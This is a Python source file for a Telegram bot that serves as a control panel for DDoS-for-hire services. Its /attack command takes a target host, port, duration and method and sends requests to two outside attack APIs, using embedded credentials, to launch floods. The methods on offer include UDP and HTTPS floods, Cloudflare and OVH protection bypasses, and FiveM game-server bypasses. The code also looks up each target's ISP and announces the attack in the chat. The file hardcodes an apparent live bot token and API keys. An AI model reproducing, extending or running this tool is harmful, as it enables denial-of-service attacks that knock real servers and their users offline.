import telebot

import requests

import time

import psutil

from datetime import datetime, timedelta



# Replace TOKEN with your bot's token

TOKEN = "7802721660:AAG8y4mTo2VwbXuH-ST4GNr1w_RvtmQMmeU"

bot = telebot.TeleBot(TOKEN)



# Admin ID

ADMIN_ID = 7591396510



# List of admin users

admins = [ADMIN_ID]



# Bot status (default unlocked)

bot_locked = False



# Store the time when the bot starts

start_time = time.time()



# User cooldown data

user_cooldowns = {}



# List of ongoing attacks

ongoing_attacks = []



# Slot tracking

max_attack_slots = 20

current_attack_slots = 0



# List of attack methods

methods_info = """

<b>🛠️ Free Attack Methods</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>🌐 cloudflare:</b> <code>Bypass Cloudflare with high RPS (Requests per Second).</code>

<b>🖥️ browser:</b> <code>Automate browser requests to solve CAPTCHA and simulate human traffic.</code>

<b>💥 https-star:</b> <code>Launch an HTTPS flood to overwhelm the target's servers.</code>

<b>🚀 tcplegit:</b> <code>High-performance TCP attack targeting server connections.</code>

<b>📡 udp:</b> <code>Send high PPS (Packets per Second) UDP flood for volume-based attacks.</code>

<b>🔒 tcp-bypass:</b> <code>Bypass specific TCP protections using spoofed server packets.</code>

<b>🛡️ ovh:</b> <code>Specialized OVH protection bypass targeting infrastructure.</code>

<b>🎮 fivem:</b> <code>Bypass protections on FiveM game servers.</code>

━━━━━━━━━━━━━━━━━━━━━━

"""



# Slot locking methods

locked_methods = []



# Command to show attack methods

@bot.message_handler(commands=['methods'])

def methods_command(message):

    if bot_locked:

        bot.reply_to(message, "<b>🔒 Bot is locked. Unlock it to use this command.</b>", parse_mode="HTML")

        return

    bot.reply_to(message, methods_info, parse_mode="HTML")



# Command to start an attack

@bot.message_handler(commands=['attack'])

def attack_command(message):

    global current_attack_slots



    if bot_locked:

        bot.reply_to(message, "<b>🔒 Bot is locked. Unlock it to use this command.</b>", parse_mode="HTML")

        return



    args = message.text.split()

    if len(args) < 5:

        bot.reply_to(message, "<b>Usage: /attack (Host) (Port) (Time) (Method)</b>", parse_mode="HTML")

        return



    if current_attack_slots >= max_attack_slots:

        bot.reply_to(

            message,

            "<b>❌ All attack slots are currently in use. Please wait for a slot to become available.</b>",

            parse_mode="HTML"

        )

        return



    host, port, attack_time, method = args[1], args[2], int(args[3]), args[4]

    username = message.from_user.username or "Unknown"



    # List of valid attack methods

    allowed_methods = ["cloudflare", "browser", "https-star", "tcplegit", "udp", "tcp-bypass", "ovh", "fivem"]



    if method not in allowed_methods or method in locked_methods:

        bot.reply_to(

            message,

            "<b>❌ Invalid or locked method. Use /methods to see available methods.</b>",

            parse_mode="HTML"

        )

        return



    api1_url = f"https://api.mstress.ru/api/attack?username=cz2&key=sonacnc&host={host}&time={attack_time}&port={port}&method={method}"

    api2_url = f"https://api-sona.xyz/api/attack?username=ventox&secret=ventox&host={host}&time={attack_time}&port={port}&method={method}"



    try:

        requests.get(api1_url)

        requests.get(api2_url)



        # Add attack slot and track attack

        current_attack_slots += 1

        attack_id = len(ongoing_attacks) + 1

        ongoing_attacks.append({

            "id": attack_id,

            "host": host,

            "port": port,

            "time": attack_time,

            "method": method,

            "initiated_by": username

        })



        # Get ISP info

        ip_info = requests.get(f"http://ip-api.com/json/{host}").json()

        isp = ip_info.get("isp", "Unknown ISP")

        country = ip_info.get("country", "Unknown Country")

        org = ip_info.get("org", "Unknown Organization")



        # Get attack sent time

        attack_sent_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")



        # Imgur link (replace with your actual image link)

        imgur_link = "https://l.top4top.io/p_3390ewxcp0.gif"



        # Send attack info

        bot.send_photo(

            message.chat.id,

            imgur_link,

            caption=(

                f"<b>🔴 Attack Launched 🔴</b>\n"

                f"━━━━━━━━━━━━━━━━━━━━━━\n"

                f"<b>🎯 Target:</b> {host}\n"

                f"<b>🔌 Port:</b> {port}\n"

                f"<b>⏱️ Duration:</b> {attack_time}s\n"

                f"<b>⚒️ Method:</b> {method}\n"

                f"━━━━━━━━━━━━━━━━━━━━━━\n"

                f"<b>🌍 ISP:</b> {isp}\n"

                f"<b>📍 Country:</b> {country}\n"

                f"<b>🏢 Organization:</b> {org}\n"

                f"━━━━━━━━━━━━━━━━━━━━━━\n"

                f"<b>📅 Sent At:</b> {attack_sent_time}\n"

                f"<b>👤 Initiated By:</b> @{username}\n"

                f"<b>🆔 Attack ID:</b> #{attack_id}\n"

                f"━━━━━━━━━━━━━━━━━━━━━━\n"

                f"<b>🟢 Slots:</b> {current_attack_slots}/{max_attack_slots} in use\n"

            ),

            parse_mode="HTML"

        )



        # Schedule attack slot release

        time.sleep(attack_time)

        current_attack_slots -= 1



    except Exception as e:

        bot.reply_to(message, f"<b>❌ Error Occurred: {str(e)}</b>", parse_mode="HTML")



# Command to show bot status (including uptime, CPU, and RAM)

@bot.message_handler(commands=['status'])

def status_command(message):

    if bot_locked:

        bot.reply_to(message, "<b>🔒 Bot is locked. Unlock it to use this command.</b>", parse_mode="HTML")

        return



    # Get system stats

    cpu_usage = psutil.cpu_percent(interval=1)  # Get CPU usage in percent

    ram_usage = psutil.virtual_memory().percent  # Get RAM usage in percent

    uptime_seconds = time.time() - start_time  # Get bot uptime in seconds

    uptime = str(timedelta(seconds=int(uptime_seconds)))  # Format uptime



    locked_methods_list = ", ".join(locked_methods) if locked_methods else "None"



    status_message = (

        f"<b>🟢 Bot Status:</b>\n"

        f"━━━━━━━━━━━━━━━━━━━━━━\n"

        f"<b>🔒 Bot Locked:</b> {'Yes' if bot_locked else 'No'}\n"

        f"<b>🛠️ Locked Methods:</b> {locked_methods_list}\n"

        f"<b>🟢 Attack Slots:</b> {current_attack_slots}/{max_attack_slots} in use\n"

        f"<b>⏱️ Bot Uptime:</b> {uptime}\n"

        f"<b>💻 CPU Usage:</b> {cpu_usage}%\n"

        f"<b>🧠 RAM Usage:</b> {ram_usage}%\n"

        f"━━━━━━━━━━━━━━━━━━━━━━"

    )



    bot.reply_to(message, status_message, parse_mode="HTML")



# Command to lock the bot

@bot.message_handler(commands=['lock'])

def lock_bot(message):

    if message.from_user.id == ADMIN_ID:

        global bot_locked

        bot_locked = True

        bot.reply_to(message, "<b>🔒 The bot has been locked.</b>", parse_mode="HTML")

    else:

        bot.reply_to(message, "<b>❌ You are not authorized to lock the bot.</b>", parse_mode="HTML")



# Command to unlock the bot

@bot.message_handler(commands=['unlock'])

def unlock_bot(message):

    if message.from_user.id == ADMIN_ID:

        global bot_locked

        bot_locked = False

        bot.reply_to(message, "<b>🟢 The bot has been unlocked.</b>", parse_mode="HTML")

    else:

        bot.reply_to(message, "<b>❌ You are not authorized to unlock the bot.</b>", parse_mode="HTML")



# Command to lock a specific method

@bot.message_handler(commands=['lockmethod'])

def lock_method(message):

    if message.from_user.id == ADMIN_ID:

        args = message.text.split()

        if len(args) < 2:

            bot.reply_to(message, "<b>❌ Usage: /lockmethod (Method)</b>", parse_mode="HTML")

            return



        method = args[1]

        if method not in ["cloudflare", "browser", "https-star", "tcplegit", "udp", "tcp-bypass", "ovh", "fivem"]:

            bot.reply_to(message, "<b>❌ Invalid method. Use /methods to see available methods.</b>", parse_mode="HTML")

            return



        if method not in locked_methods:

            locked_methods.append(method)

            bot.reply_to(message, f"<b>🔒 Method {method} has been locked.</b>", parse_mode="HTML")

        else:

            bot.reply_to(message, f"<b>❌ Method {method} is already locked.</b>", parse_mode="HTML")

    else:

        bot.reply_to(message, "<b>❌ You are not authorized to lock methods.</b>", parse_mode="HTML")



# Command to unlock a specific method

@bot.message_handler(commands=['unlockmethod'])

def unlock_method(message):

    if message.from_user.id == ADMIN_ID:

        args = message.text.split()

        if len(args) < 2:

            bot.reply_to(message, "<b>❌ Usage: /unlockmethod (Method)</b>", parse_mode="HTML")

            return



        method = args[1]

        if method in locked_methods:

            locked_methods.remove(method)

            bot.reply_to(message, f"<b>🟢 Method {method} has been unlocked.</b>", parse_mode="HTML")

        else:

            bot.reply_to(message, f"<b>❌ Method {method} is not locked.</b>", parse_mode="HTML")

    else:

        bot.reply_to(message, "<b>❌ You are not authorized to unlock methods.</b>", parse_mode="HTML")



# Command to add a new admin

@bot.message_handler(commands=['addadmin'])

def add_admin(message):

    if message.from_user.id == ADMIN_ID:

        # Check if the command has an argument (the user ID to be added as admin)

        args = message.text.split()

        if len(args) < 2:

            bot.reply_to(message, "<b>❌ Usage: /addadmin (User ID)</b>", parse_mode="HTML")

            return



        user_id_to_add = args[1]

        try:

            user_id_to_add = int(user_id_to_add)

            if user_id_to_add not in admins:

                admins.append(user_id_to_add)

                bot.reply_to(message, f"<b>✅ User with ID {user_id_to_add} has been added as an admin.</b>", parse_mode="HTML")

            else:

                bot.reply_to(message, f"<b>❌ User with ID {user_id_to_add} is already an admin.</b>", parse_mode="HTML")

        except ValueError:

            bot.reply_to(message, "<b>❌ Invalid User ID. Please provide a valid numeric user ID.</b>", parse_mode="HTML")

    else:

        bot.reply_to(message, "<b>❌ You are not authorized to add admins.</b>", parse_mode="HTML")



# Start the bot

bot.polling()



